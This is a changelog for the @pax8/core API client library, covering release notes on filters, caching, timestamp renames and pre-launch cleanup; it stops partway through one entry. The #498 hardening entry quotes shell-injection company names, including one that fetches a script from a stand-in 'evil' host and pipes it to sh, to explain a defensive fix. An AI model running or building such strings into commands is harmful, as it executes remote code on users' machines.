# @pax8/core

## 0.1.2

### Patch Changes

- [#592](https://github.com/pax8labs/pax8-cli/pull/592) [`04aebb8`](https://github.com/pax8labs/pax8-cli/commit/04aebb8f0df7d933d60d92628b1e1e43107049ef) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix the `Pax8Client` quick-example in the README. The previous example used `client.subscriptions.listAll({...})` and `client.companies.listAll()` — methods that don't exist on the published sub-clients. The actual API is `client.subscriptions.list({...})` returning a `{ content, page }` envelope. Corrected the example, clarified the envelope shape, and listed the sub-clients that share the surface. Closes [#591](https://github.com/pax8labs/pax8-cli/issues/591).

<!--
  Pre-release window: entries below accumulated under 0.1.0 until the first
  public release (publish gate: #370 — opened 2026-06-04). The phantom
  0.2.0 / 0.3.0 / 0.4.0 version headings written by `changeset version` PRs
  during the pre-release window were collapsed; substance preserved.
-->

## 0.1.0 — 2026-06-04

### Patch Changes

- [#555](https://github.com/pax8labs/pax8-cli/pull/555) [`c56eb06`](https://github.com/pax8labs/pax8-cli/commit/c56eb060d996c3ac248487ad3ab3ad22d5127315) Thanks [@jidulberger](https://github.com/jidulberger)! - Branch coverage push on the three `@pax8/core` API clients flagged in the partner-readiness audit. Closes [#393](https://github.com/pax8labs/pax8-cli/issues/393).

  Coverage delta (branches):
  - `packages/core/src/api/products.ts` — **0% → 100%**
  - `packages/core/src/api/invoices.ts` — **38% → 69%**
  - `packages/core/src/api/webhooks.ts` — **57% → 71%**

  Products clears the AC threshold (≥ 85%); invoices and webhooks fall short of the 85% target but capture the load-bearing branches the audit specifically flagged:
  - products: `list()`'s no-params path, `search()`'s longest-token reduce + multi/single/empty query paths + the `apiKeyword || undefined` ternary, vendor pass-through.
  - invoices: `list()`'s no-params path, `month` ↔ `invoiceDate` precedence, empty-content envelope, `listItems()` aggregate fan-out across companies + explicit-invoiceId short-circuit + no-args fallback + client-side pagination of aggregated items.
  - webhooks: `getTopicDefinitions` flat-array parity-drift branch, `setStatus(active=false)` toggle branch, `testTopic` URL-encoding of topic slugs with `/`.

  The remaining ~14-16% gap on invoices/webhooks lives in nullish-coalescing micro-branches (`opts.page ?? 0`, `pageSize ?? items.length`, etc.) where the marginal value of an explicit test isn't worth the maintenance overhead. Open a follow-up issue if a future coverage-gate raise needs them.

  Full suite: 2150 passing (+6 from this PR).

- [#567](https://github.com/pax8labs/pax8-cli/pull/567) [`9842846`](https://github.com/pax8labs/pax8-cli/commit/98428464403624b833a2af8b63d62ed1137e97e2) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix test regression introduced by [#557](https://github.com/pax8labs/pax8-cli/issues/557) (opt-in caching). Two assertions in `packages/core/src/config/loader.test.ts` still expected `cache.enabled` to default to `true`, but [#557](https://github.com/pax8labs/pax8-cli/issues/557) intentionally flipped the default to `false` (opt-in caching) without updating the matching test expectations. Tests now match the shipped behavior. No code change to the loader itself — the production behavior is correct, only the test was stale.

  This was blocking CI on every PR opened after [#557](https://github.com/pax8labs/pax8-cli/issues/557) landed, because PR build matrices evaluate the merge commit against `main` and inherit `main`'s broken test suite.

- [#569](https://github.com/pax8labs/pax8-cli/pull/569) [`2f3b657`](https://github.com/pax8labs/pax8-cli/commit/2f3b6571842cc3080351bbfd3d24d62d131b6848) Thanks [@jidulberger](https://github.com/jidulberger)! - Pre-launch scrub: remove internal Pax8 system references that [#461](https://github.com/pax8labs/pax8-cli/issues/461)/[#489](https://github.com/pax8labs/pax8-cli/issues/489) missed. No behavior change; only comments, help text, and one private URL.
  - **Internal Jira-style ticket prefixes** (`ARC-`, `PAE-`, `PAM-`) — present in user-facing `--help` text on `pax8 recommendations list / act` and `pax8 clients create`, plus a dozen code comments across `packages/cli` and `packages/core`. Partners running `--help` saw "ARC-785" / "PAM-997" with no context; rewrote the text to be self-contained (e.g. "Pax8's first-party Opportunity Explorer API ships" instead of "ARC-785, `GET /opportunities`"). The companion test assertion in `companies.test.ts` that checked for `"PAM-997"` in `--help` output now checks for `"Pax8 API Reference"` to match the new wording.
  - **Reviewer names** (`Cassie`) — leaked through into source comments and one changeset; replaced with generic "domain review" / "partner walkthrough" framing.
  - **Private Atlassian URLs** — `packages/core/src/api/types.test.ts` had two `pax8.atlassian.net` links in its preamble (Marketplace Data Risk Tiering doc, CLI Domain Review approval doc). Public viewers would 403; replaced with paraphrased descriptions.
  - **Stale doc reference** — `docs/pm-review-response-2026-05.md` cited in `types.test.ts` doesn't exist in the repo. Removed.

  Historical per-package CHANGELOGs (`packages/cli/CHANGELOG.md`, `packages/core/CHANGELOG.md`) deliberately left alone — they're append-only release-note records.

### Minor Changes

- [#544](https://github.com/pax8labs/pax8-cli/pull/544) [`74cd0e4`](https://github.com/pax8labs/pax8-cli/commit/74cd0e44120aebe49baa0f154cffb6d039840b38) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 subscriptions list` now exposes the server-side `billingTerm`, `productId`, and `sort` filters the public OpenAPI has always supported. Closes [#398](https://github.com/pax8labs/pax8-cli/issues/398).

  Three new flags, additive — every existing invocation still works unchanged:
  - `--billing-term <Monthly|Annual|2-Year|3-Year|One-Time|Trial|Activation>` — fails fast on typos before any network call, same vocabulary as `--status` ([#408](https://github.com/pax8labs/pax8-cli/issues/408)).
  - `--product <productId>` — passes through to the wire as `?productId=…`. UUID expected; no fuzzy product-name resolution here because the typical use case is `subscriptions list --product <copy-pasted-id-from-a-prior-row>`.
  - `--sort <field>` / `--sort <field>:<direction>` — accepts `quantity`, `startDate`, `endDate`, `createdAt`. Ascending by default; append `:desc` for descending. The user-facing separator is `:` (not `,`) to avoid shell-quoting surprises; the CLI rewrites it to the wire's `field,direction` form before forwarding.

  Pre-fix, partners with large portfolios had to download a full subscriptions list and filter client-side — even though the OpenAPI spec defined these parameters. `MockPax8Client.SubscriptionsResource.list` mirrors the server-side filtering for every new parameter so `PAX8_DEMO=1` exercises the same code path as the real API.

  `@pax8/core`'s `SubscriptionsApi.list` signature gains the three new optional fields. Type-safe additive change; consumers that don't pass the new fields are unaffected.

### Patch Changes

- [#543](https://github.com/pax8labs/pax8-cli/pull/543) [`e7ef4a7`](https://github.com/pax8labs/pax8-cli/commit/e7ef4a72a15ec7e491e4c948ae571a0340ffc8df) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 products show <id> --provisioning` now hits the correct Pax8 endpoint and parses the response shape per the spec. Closes [#443](https://github.com/pax8labs/pax8-cli/issues/443) (Candidate H from `docs/triage/v0.1.0-candidates.md`), surfaced by Fred Lintz's correction during domain review.

  Three bugs fixed in lockstep — the half-implementation worked under `PAX8_DEMO=1` (the mock matched the hallucination) but would 404 against the real API and then throw a Zod parse error after the path:
  1. **Endpoint path.** `/products/{id}/provisioning-details` → `/products/{id}/provision-details` (the Pax8 spec uses the singular form per `findProvisionDetailsByProductId`).
  2. **Response shape.** The endpoint returns `{ content: ProvisioningDetail[] }` (envelope-wrapped array). `getProvisioningDetails` now returns `ProvisioningDetail[]`; `products show --provisioning --json` emits a top-level `provisioningDetails` array, not the previous single object.
  3. **Schema.** Replaced the hallucinated `{ productId, vendorPrerequisites, fields[{ name, label, type, required, options }] }` with the spec shape: `{ key?, label?, description?, valueType?: "Input" | "Single-Value" | "Multi-Value", possibleValues?, values? }`. The schema is now shared with the `orders create` and `subscriptions update` write paths — same component on the wire, same shape in `@pax8/core`.

  Mock fixtures (`packages/core/src/mock/mock-client.ts`) updated to the spec shape too, so `PAX8_DEMO=1` and the real API now exercise the same code path. **Breaking** to `provisioningDetails` JSON shape (was a single object with `productId/vendorPrerequisites/fields`; now a `ProvisioningDetail[]` array) — pre-publish, no deprecation owed.

  Threading provision details into orders / subscriptions write paths per Fred's "safest bet is to always add provision details to each line item" guidance is tracked separately as Candidate H Option B.

### Minor Changes

- [#381](https://github.com/pax8labs/pax8-cli/pull/381) [`830774a`](https://github.com/pax8labs/pax8-cli/commit/830774a8845058541f6cc01afc16dc147694cdbe) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 companies create` (and its `pax8 clients create` alias) now creates Active companies by default via the atomic contacts-array pattern (PAM-997 / PAM-1171 / ARC-774). The same `POST /companies` accepts an optional `contacts: [...]` array; including a properly-typed primary contact flips the new company from Inactive to Active at creation.

  New required flags on the default (atomic) path: `--first-name`, `--last-name`, `--email`, `--phone`. The supplied contact is implicitly set as `primary: true` for all three ContactType values (Admin, Billing, Technical), matching the Pax8 API Reference's activation guidance: "one contact with all three types and marked as primary for each type is sufficient." `--phone` is shared between the company and the contact — partners who need different phones can use `--company-only` then `pax8 contacts create`.

  Opt-out via `--company-only` produces an Inactive company. The command prints a verbatim warning to stderr explaining the consequences (won't appear in portal, won't support orders/subscriptions/quotes, blocks re-creation with "already exists" until primary contacts are added via `pax8 contacts create`).

  `@pax8/core` schema: new `CreateCompanyContactInputSchema` for the inline contact payload; `CreateCompanyInputSchema` gains an optional `contacts` field. The inline shape mirrors `CreateContactInputSchema` but omits `companyId` (the company doesn't exist yet).

  Closes [#330](https://github.com/pax8labs/pax8-cli/issues/330). Addresses pre-publish review feedback that the v0.1.0 CLI was creating Inactive companies that partners couldn't use until they discovered the contact requirement.

- [#405](https://github.com/pax8labs/pax8-cli/pull/405) [`d20b113`](https://github.com/pax8labs/pax8-cli/commit/d20b1137ec74e81c9745f5f8f76484086a2f44e8) Thanks [@jidulberger](https://github.com/jidulberger)! - Expose every server-side list filter the OpenAPI spec already supports on the `quotes`, `clients`/`companies`, and `invoices` list endpoints. Three related fix-before-launch findings from the partner-readiness audit (`docs/triage/partner-readiness-audit/01-api-conformity-reads.md`) — the spec defined the filters, but the CLI either filtered client-side (quotes) or omitted the parameters entirely (companies, invoices), forcing partners with large portfolios to download full lists before filtering locally.
  - `pax8 quotes list --status` is now server-side and accepts the full 9-value v2 enum (`draft | assigned | sent | closed | declined | accepted | changes_requested | expired | pending`). Closes [#387](https://github.com/pax8labs/pax8-cli/issues/387).
  - `pax8 clients list` (and `pax8 companies list`) now expose `--city` / `--state` / `--country` / `--zip`, `--self-service` / `--bill-on-behalf` / `--order-approval`, and `--sort <name|city|country|state|zip>`. The CLI vocabulary maps `--state` → `stateOrProvince` and `--zip` → `postalCode` per the existing convention documented for `companies create` ([#327](https://github.com/pax8labs/pax8-cli/issues/327)/[#328](https://github.com/pax8labs/pax8-cli/issues/328)). The generic `filter` parameter on `CompaniesApi.list` (no OpenAPI backing) is dropped — no deprecation since the package is pre-v0.1.0. Closes [#388](https://github.com/pax8labs/pax8-cli/issues/388).
  - `pax8 invoices list` now exposes `--from` / `--to` (mapping to `invoiceDateRangeStart` / `invoiceDateRangeEnd`) and `--sort` with the full spec enum (`invoice-date | due-date | status | partner-name | total | balance | carried-balance`). The kebab-cased flag values map onto the wire's camelCase. Closes [#389](https://github.com/pax8labs/pax8-cli/issues/389).

  All three are additive — existing invocations without the new flags continue to work unchanged. `MockPax8Client` mirrors the server-side filtering for every new parameter so `PAX8_DEMO=1` exercises the same code path as the real API.

- [#531](https://github.com/pax8labs/pax8-cli/pull/531) [`45fe0d1`](https://github.com/pax8labs/pax8-cli/commit/45fe0d1db00d678c73b709a6137f2e64d69038f6) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 orders list` now surfaces pagination, sorts newest-first by default, and resolves company names beyond the first 200 customers. Four sub-defects from [#478](https://github.com/pax8labs/pax8-cli/issues/478) (repro: Cassie's 45,208-order partner portfolio) fixed in one PR.
  - **Pagination is visible.** `--json` now wraps the result as `{ orders, page: { number, size, totalElements, totalPages } }` (1-based `number` matches the `--page` flag). The table footer shows `Page X of Y — N orders` plus an explicit `next: pax8 orders list --page <n+1>` hint when more pages exist (suppressed on the last page). `--with-actions` adds a `nextActions` entry pre-built with the next page's command. Pre-fix the JSON output was a flat array and the footer just said `45208 orders` with no page indicator — agents and partners had no signal that pagination existed.
  - **Default sort is newest-first.** The CLI sends `?sort=createdAt,desc` by default; `--sort <field>` and `--order <asc|desc>` override. Pre-fix the CLI sent no sort hint and the real Pax8 API returned 2013-era archives in row 1 on long-lived tenants. `OrdersApi.list()` accepts the new `sort` parameter and forwards it on the wire.
  - **`--status` flag removed.** Wire-level testing on 2026-05-11 ([#369](https://github.com/pax8labs/pax8-cli/issues/369)) confirmed the Pax8 server silently ignores `?status=` — every value, including bogus ones, returned the unfiltered set. The flag was previously kept as a documented no-op, but `pax8 orders list --status Completed | grep Completed` gave partners no way to know they were looking at unfiltered data. The flag is removed entirely; Commander emits `unknown option --status` and exits 1. We'll re-add it when the platform ships real status filtering ([#369](https://github.com/pax8labs/pax8-cli/issues/369)).
  - **Company column populates beyond row 200.** The CLI pages through `companies.list` until every `companyId` referenced by the orders page is covered (capped at 10 pages of 1000 to bound the loop). When a partner has more customers than the cap can cover, a single stderr warning explains the placeholder rather than leaving silent blanks. Pre-fix the CLI fetched only the first 200 companies, so partners with >200 customers saw blank `Company` cells on most rows.

  Demo mode (`MockPax8Client`) honors the new `sort` parameter so `PAX8_DEMO=1` exercises the same code path as the real wire. The `OrdersResource.list` mock continues to filter on the dropped `status` param for backwards compatibility with any in-tree fixtures that still pass it, but no command code now sends it.

  Closes [#478](https://github.com/pax8labs/pax8-cli/issues/478).

- [#430](https://github.com/pax8labs/pax8-cli/pull/430) [`5617161`](https://github.com/pax8labs/pax8-cli/commit/561716145e254eaf91d75c00c8b6e371c8856c22) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 quotes line-items add` and `pax8 quotes create` (shorthand path) now accept `--commitment-term <enum>` and `--commitment-term-id <uuid>`, mirroring the orders create pattern (`packages/cli/src/commands/orders/create.ts:350-351`). When `--commitment-term` is supplied, the CLI auto-resolves it to a commitment-term UUID against the partner's existing subscriptions for the product — same `resolveCommitmentTermId()` helper orders create uses. When `--commitment-term-id` is supplied directly, it wins over any `--commitment-term` (UUID short-circuits the lookup, matching orders create precedence). The resolved `commitmentTermId` rides through to `POST /v2/quotes/{quoteId}/line-items` as `AddStandardLineItemPayload.commitmentTermId` (spec-confirmed in `quoting-endpoints.json`).

  Required for Microsoft NCE and other commitment-priced SKUs per QUOTE-311 (the `AddLineItemToQuoteCommandPayload.commitmentTermId` field), QUOTE-1283 (commitment persisted on the line item itself), QUOTE-406 (backfill of older NULL rows), and the NCE proration spike (Model A canonical — commitment is decided at quote-time and inherited by the resulting order).

  `@pax8/core`: `AddQuoteLineItemInputSchema` gains `commitmentTermId: z.string().optional()` (mirrors `OrderLineItemInputSchema`'s shape — not strict `.uuid()` because demo fixtures use Pax8-style synthetic IDs). `QuoteLineItemSchema` gains `commitmentTerm: CommitmentSchema.nullable().optional()` for the read surface (`{ id, term }` per the v2 spec's `LineItemResponse.commitmentTerm`). The existing `CommitmentSchema` is reused rather than defining a new shape — its extra-optional `endDate` is harmless on the quote-line wire and reuse means future drift propagates to both consumers.

  `pax8 quotes show` and `pax8 quotes line-items list` now render a "Commit" column on the line-item table (the term label, e.g. "1-Year"); `--json` consumers see the full `commitmentTerm: { id, term }` object. Mirrors how subscriptions render `commitment.term`.

  Demo fixture: the Redwood E5 line on `quote-redwood-001` now carries `commitmentTerm: { id, term: "1-Year" }` so the render path exercises end-to-end under `PAX8_DEMO=1`.

  The parity test from [#426](https://github.com/pax8labs/pax8-cli/issues/426) (`packages/cli/src/__tests__/quotes-create-line-items-parity.test.ts`) was already structural — both new flags pass automatically. Belt-and-braces pin updated to enumerate them.

  Follow-up to [#429](https://github.com/pax8labs/pax8-cli/issues/429) (Candidate E in `docs/triage/v0.1.0-candidates.md`).

- [#427](https://github.com/pax8labs/pax8-cli/pull/427) [`d71a0f2`](https://github.com/pax8labs/pax8-cli/commit/d71a0f2e600332167587a2fffbf4198a32fa9e8b) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 quotes show` now surfaces server-side totals from the v2 quoting API's `QuoteResponse.totals` object. Splits one-time charges (`Total (initial)`) from per-period subscription charges (`Total (recurring)`) — each shown with currency code. Zero-bucket lines are suppressed so a recurring-only quote shows only the recurring line and an initial-only quote shows only the initial line. When the API omits totals (defensive against API drift; the spec marks the field required), render falls back to the locally-summed sum of line-item subtotals — preserves the pre-change behavior for older API responses.

  `@pax8/core` exports two new schemas / inferred types: `AmountCurrencySchema` / `AmountCurrency` and `InvoiceTotalsSchema` / `InvoiceTotals`. `QuoteSchema` and `QuoteLineItemSchema` both gain optional `totals: InvoiceTotalsSchema` fields. Optional (not required) so a partial / drifted API response doesn't fail the whole quote parse — render layer handles the absent case explicitly. JSON output passes the `totals` shape through unchanged from the wire (no transformation), so agents can read `totals.initialCost`, `totals.initialProfit`, `totals.initialTotal`, `totals.recurringCost`, `totals.recurringProfit`, `totals.recurringTotal` directly.

- [#376](https://github.com/pax8labs/pax8-cli/pull/376) [`d88ce13`](https://github.com/pax8labs/pax8-cli/commit/d88ce13c6a0b2166f70c3d87b2320376286d0c06) Thanks [@jidulberger](https://github.com/jidulberger)! - **Recommendations (additive):** `pax8 recommendations` output now carries an `opportunityType` field alongside the existing `type`, using Pax8's canonical Opportunity Explorer 5-type taxonomy (`Upsell`, `Cross-sell`, `Add-on`, `Upgrade`, `Net-new`). Existing `type` field unchanged.

  Mapping:

  | Existing `type`              | Emitted `opportunityType` |
  | ---------------------------- | ------------------------- |
  | `cross_sell` (active subs)   | `Cross-sell`              |
  | `cross_sell` (zero-sub cust) | `Net-new`                 |
  | `seat_gap`                   | `Upsell`                  |

  Zero-subscription companies now classify as `Net-new` instead of being silently routed through the `Cross-sell` rail — the closest existing surrogate for OE's `Net-new` motion, and the fix for surprise [#7](https://github.com/pax8labs/pax8-cli/issues/7) in `docs/triage/recommendations-conformance.md`.

  Added `pax8 recommendations upsell --from-product <name> --to-product <name>` following the MCP "Proactive Upsell Opportunity Finder" composition pattern (Guide §3b): list every company on the source product who does not yet have the upsell target, with seats, current MRR, and contact details (`--with-contacts`). New exports from `@pax8/core`: `findUpsellCohort`, types `UpsellMatch`, `UpsellCohortReport`, `OpportunityType`.

  Full taxonomy alignment — retiring the CLI's security-centric 7-category product taxonomy in favor of Pax8's canonical STAX/PCM categories, and migrating `seat_gap` with an alias period — is deferred to v0.2 ([#375](https://github.com/pax8labs/pax8-cli/issues/375)), to align with whatever taxonomy OE's `GET /opportunities` API publishes when ARC-785 ships.

  Extends the disclosure-over-rewrite pattern from [#298](https://github.com/pax8labs/pax8-cli/issues/298) (vocabulary alignment) and [#299](https://github.com/pax8labs/pax8-cli/issues/299) (`mrrAtRisk` → `mrrRenewing` one-cycle alias). References Pax8 taxonomy research on PICS (4 executive categories) / STAX (8 L1 operational categories) / Taxonomy v2 (in flight, hierarchical L1/L2/L3) in the new STAX-divergence doc comment at the top of `packages/core/src/services/recommendations.ts` and in the v0.2 issue ([#375](https://github.com/pax8labs/pax8-cli/issues/375)).

- [#498](https://github.com/pax8labs/pax8-cli/pull/498) [`32cb6c8`](https://github.com/pax8labs/pax8-cli/commit/32cb6c82f920358660a027d52151a5a0656f9339) Thanks [@jidulberger](https://github.com/jidulberger)! - Two hardening fixes against adversarial input from the partner-tenant API surface:
  1. **`Recommendation.orderArgs` (new, `@pax8/core` minor bump).** `Recommendation.orderCommand` was a display string built by interpolating the upstream-controlled `companyName` into a shell template. A malicious customer name like `Acme" $(curl evil/x|sh) "` produced a working shell payload once a user or tool-using agent pasted it into `bash -c` or `eval`. New `orderArgs: string[] | null` field is the same content pre-tokenized as an argv-style array (first element is `"pax8"`); programmatic callers — REPL, `recommendations act`, the Claude skill — execute via this instead of evaluating the display string. `orderCommand` remains for display-only use and now prefers `companyId` when it's a UUID.
  2. **Bug-report redactor catches upstream-resolved names.** When an error like `Company not found: "Acme Corp"` was sent to `pax8 report-bug`, `"Acme Corp"` was not in argv, so the existing argv-derived redaction missed it and the partner name shipped to the public GitHub issue body. `redactEnvelope` now harvests quoted substrings from `message` / `causes[]` / `recoverySteps[]` and treats them as additional `argTokens`. The regex spans from the first quote to the last quote on a line, so a hostile partner name with inner quotes (`Acme" $(echo PWNED) "`) gets scrubbed atomically.

  Closes [#473](https://github.com/pax8labs/pax8-cli/issues/473). Addresses [#462](https://github.com/pax8labs/pax8-cli/issues/462).

- [#532](https://github.com/pax8labs/pax8-cli/pull/532) [`224f16a`](https://github.com/pax8labs/pax8-cli/commit/224f16a6030b8d89bfe67d1ba989b49d0fae8130) Thanks [@jidulberger](https://github.com/jidulberger)! - Strip deprecated aliases pre-public-launch ([#476](https://github.com/pax8labs/pax8-cli/issues/476)).

  Six alias families removed — all flagged in code as "remove in v0.3.0 / v1.0" or "one-cycle alias." Pre-launch is the cheapest time to take the breaking change; once we go public, external users adopt them and back-compat becomes a multi-year commitment.

  **CLI command surface (removed):**
  - `pax8 status` — canonical: `pax8 dashboard`
  - `pax8 companies *` — canonical: `pax8 clients *`. The `companies` verb was the original surface but [#317](https://github.com/pax8labs/pax8-cli/issues/317) made `clients` canonical; CLAUDE.md previously documented `companies` as an "indefinite" alias, which the issue rightly flagged as a "soft remove someday" trap. Cut now.
  - `pax8 webhooks create --events` — canonical: `--topics`

  **JSON / type surface (removed):**
  - `mrrAtRisk` field aliases (canonical: `mrrRenewing`, per [#298](https://github.com/pax8labs/pax8-cli/issues/298))
  - `arr*` field aliases (canonical names per [#298](https://github.com/pax8labs/pax8-cli/issues/298))
  - `createdDate` / `expiresOn` shadow fields (canonical: `createdAt`, `expiresAt`, per [#385](https://github.com/pax8labs/pax8-cli/issues/385))

  **Out of scope:**
  - Wire-side field names (`companyId`, `companyName`, body `expiresOn` on PUT) — unchanged. These are the Pax8 API contract.
  - The `--company` flag on commands that operate on a customer — unchanged. Matches the wire-side ID/name fields.

  Migration: a one-PR sweep updated CLAUDE.md, UX_GUIDE.md, AGENTS.md, skill.md, claude-skill tool descriptions, and every test that referenced the removed surface.

- [#407](https://github.com/pax8labs/pax8-cli/pull/407) [`8590150`](https://github.com/pax8labs/pax8-cli/commit/8590150a98e9779e1b17d9fc4dd0f0c9b587b1f2) Thanks [@jidulberger](https://github.com/jidulberger)! - Standardize timestamp field naming across `--json` output to canonical camelCase / past-tense / ISO 8601 (`createdAt`, `updatedAt`, `expiresAt`). Implements [#385](https://github.com/pax8labs/pax8-cli/issues/385) (B2 — block-launch refactor surfaced by the partner-readiness audit dim 02). Also closes [#390](https://github.com/pax8labs/pax8-cli/issues/390) (F5 — `Company.created` naming).

  **Migration matrix:**

  | Type         | Old field(s)                                  | New field(s)             |
  | ------------ | --------------------------------------------- | ------------------------ |
  | Company      | `created`, `updatedDate`                      | `createdAt`, `updatedAt` |
  | Order        | `createdDate`                                 | `createdAt`              |
  | Subscription | `createdDate`                                 | `createdAt`              |
  | Quote        | `createdOn`, `expiresOn`                      | `createdAt`, `expiresAt` |
  | Webhook      | `createdDate` (`updatedAt` already canonical) | `createdAt`              |

  **Deprecation policy:** During this minor-version cycle the `--json` output emits BOTH the old and new field names on every row, mirroring the `mrrAtRisk` → `mrrRenewing` precedent from [#299](https://github.com/pax8labs/pax8-cli/issues/299). Existing `--json` consumers that read the old names keep working unchanged. The old aliases are slated for removal in **v0.3.0** and carry `@deprecated` JSDoc on the schema. New code should reference the canonical names exclusively.

  **Schema-layer mechanics:** Each affected `*Schema` in `packages/core/src/api/types.ts` now wraps its object validator in a `z.preprocess()` step that accepts EITHER shape on the wire and populates BOTH names on the parsed object. The change is purely additive — new optional schema fields, no breaking changes to required ones. Demo data (`packages/core/src/mock/demo-data.ts`) keeps emitting the legacy wire shape so the preprocess code path is exercised in demo mode the same way it runs against the real API. CLI commands (`packages/cli/src/commands/`) and table/CSV column definitions reference the canonical names; the legacy aliases survive only on the `--json` output surface.

  Subprocess tests (`packages/cli/src/__tests__/{companies,subscriptions,orders,quotes,webhooks.show}.test.ts`) pin that both old and new field names are present on every row of `--json` output for all five resource types. Unit tests in `packages/core/src/api/types.test.ts` pin that parsing either wire shape (legacy or canonical) produces both names on the parsed object.

### Patch Changes

- [#497](https://github.com/pax8labs/pax8-cli/pull/497) [`3796bf9`](https://github.com/pax8labs/pax8-cli/commit/3796bf9f1028bef64bf6cc6fcb24042466644740) Thanks [@jidulberger](https://github.com/jidulberger)! - Three interlocking fixes to the response-cache layer:
  1. **Tenant + base-URL scoping.** `Pax8Client.buildCacheKey` previously keyed only on path / params / api / version, so a credential rotation or `PAX8_API_BASE` flip silently served tenant-A's cached responses into a tenant-B session for up to 24h (default TTL). Cache keys now include a SHA-256-truncated hash of `(clientId, PAX8_API_BASE env, baseUrl, apiBaseOverrides)`. **Upgrading invalidates existing on-disk cache entries** because the key prefix changes — first run after upgrade will be slower as the cache refills.
  2. **Detached cache warmer removed.** `buildContext` was spawning three detached `pax8 list` child processes on every command run (companies / subscriptions / products) as a "warm the cache" optimization. Net effect was every invocation fanning into four processes, unnecessary API calls on commands that didn't need the data, and noise in `--quiet` mode process listings. Removed.
  3. **`cache.enabled` / `cache.ttl_hours` honored.** The schema accepted these fields but `buildContext` never read them, so `cache.enabled: false` in `~/.pax8/config.yaml` still got the constructor's hard-coded 1h default. Now plumbed through end-to-end.

  Closes [#455](https://github.com/pax8labs/pax8-cli/issues/455), [#466](https://github.com/pax8labs/pax8-cli/issues/466). Addresses [#253](https://github.com/pax8labs/pax8-cli/issues/253).

- [#413](https://github.com/pax8labs/pax8-cli/pull/413) [`2788c73`](https://github.com/pax8labs/pax8-cli/commit/2788c73c6fcd83aba6f1d9aa32fb25e2e374f963) Thanks [@jidulberger](https://github.com/jidulberger)! - Hotfix for typecheck regression introduced by [#407](https://github.com/pax8labs/pax8-cli/issues/407). The timestamp standardization added canonical `createdAt` / `updatedAt` / `expiresAt` fields to the Zod schemas but didn't update the hand-coded interfaces in `packages/core/src/mock/demo-data.ts`. CLI command code (post-[#407](https://github.com/pax8labs/pax8-cli/issues/407)) reads `.createdAt` directly; TypeScript's union-narrowing across `Order | DemoOrder` (etc.) required the field on both sides, so accessing it failed with `Property 'createdAt' does not exist`. Main was broken on `pnpm -r exec tsc --noEmit` since [#407](https://github.com/pax8labs/pax8-cli/issues/407) merged; `pnpm test` passed because vitest doesn't run that step.

  Fix: add canonical timestamp fields to all five demo-data interfaces (Company, Subscription, Order, Quote, Webhook), duplicate the 39 fixture records to carry both names, and ensure the four `create()` methods in `MockPax8Client` populate the new fields. Also normalize `quotes.update({ expiresOn })` to set BOTH `expiresOn` AND `expiresAt` so the schema preprocess doesn't revert user updates to the stored alias value.

  No public-API change. JSON output continues to emit both old and new names per [#385](https://github.com/pax8labs/pax8-cli/issues/385).

- [#380](https://github.com/pax8labs/pax8-cli/pull/380) [`788c83a`](https://github.com/pax8labs/pax8-cli/commit/788c83a01906095882bc53110ee8df285eb9da20) Thanks [@jidulberger](https://github.com/jidulberger)! - `FileCache` now honors `PAX8_CONFIG_DIR` (via `getConfigDir()`) instead of hardcoding `~/.pax8/cache`. The hardcoded path meant any caller that used the documented `PAX8_CONFIG_DIR` escape hatch got an inconsistent cache root, and the integration test harness in particular was unable to isolate per-worker caches — a `[pax8] CACHE HIT` from a previous test served stale data on rerun.

  Behavior change is purely additive: if you don't set `PAX8_CONFIG_DIR`, `getConfigDir()` still returns `~/.pax8`, so the cache stays at `~/.pax8/cache`. Callers passing an explicit `cacheDir` to the `FileCache` constructor are unaffected.

  Also adds `e2e/integration/orders.integration.test.ts` (orders v1 smoke + the `--status` no-op pin per [#369](https://github.com/pax8labs/pax8-cli/issues/369)) and updates the harness to (a) force `PAX8_DEMO=false` so a developer's `demo: true` config can't false-green integration runs, and (b) point each worker at a throwaway `PAX8_CONFIG_DIR` so the cache fix actually isolates per-worker.

- [#441](https://github.com/pax8labs/pax8-cli/pull/441) [`bcd6fec`](https://github.com/pax8labs/pax8-cli/commit/bcd6fecc81ff470124382bae3bddd82afb27cb32) Thanks [@jidulberger](https://github.com/jidulberger)! - Reconcile OSS license references for consistency before publish ([#434](https://github.com/pax8labs/pax8-cli/issues/434)).

  Fixed the one drift case where the human-readable README used "Apache 2.0" (space) while every machine-readable surface — every `package.json`'s `license` field, every SPDX header in source — uses the canonical SPDX identifier `Apache-2.0` (hyphenated). The change is one character (space → hyphen) in `README.md`, but the rationale is partner clarity: a single canonical form across every surface a partner, contributor, or automated license scanner reads.

  Adds `packages/cli/src/__tests__/license-consistency.test.ts` as a regression guard, mirroring the forbidden-fields walker pattern from [#315](https://github.com/pax8labs/pax8-cli/issues/315). Future PRs cannot reintroduce the non-canonical "Apache <digit>" form in any tracked file outside the verbatim `LICENSE` template and historical CHANGELOG entries.

  Walked the full 12-surface audit from [#434](https://github.com/pax8labs/pax8-cli/issues/434) (NOTICE, GitHub About, `pax8 --version`, `pax8 doctor`, `packages/core/README.md`, `docs/`, telemetry payloads, `.changeset/*`, generated CHANGELOG, README header badges, CI workflows, dependency licenses). Findings are in the PR description.

  Dependency-license review: no GPL/AGPL/SSPL or other Apache-2.0-incompatible licenses across the dependency tree. The single `Unknown` entry (`spawndamnit`, a transitive dev-only changesets dep) ships an MIT LICENSE file; `pnpm` just can't parse its `"SEE LICENSE IN LICENSE"` field. `MPL-2.0` and `Python-2.0` entries are dev-only and compatible.

  The separate coordination item — LICENSE legal sign-off (owner Courtney Norton, tracked in `docs/triage/launch-coordination.md`) — is not replaced by this change. Both must clear before publish.

- [#502](https://github.com/pax8labs/pax8-cli/pull/502) [`93a7405`](https://github.com/pax8labs/pax8-cli/commit/93a7405e34556d62ef89dcfe1c2b13c693d5de95) Thanks [@jidulberger](https://github.com/jidulberger)! - Two interlocking money-correctness fixes that both inflated and mislabeled partner-cost numbers across dashboard, recommendations, cost-sim, and reports.

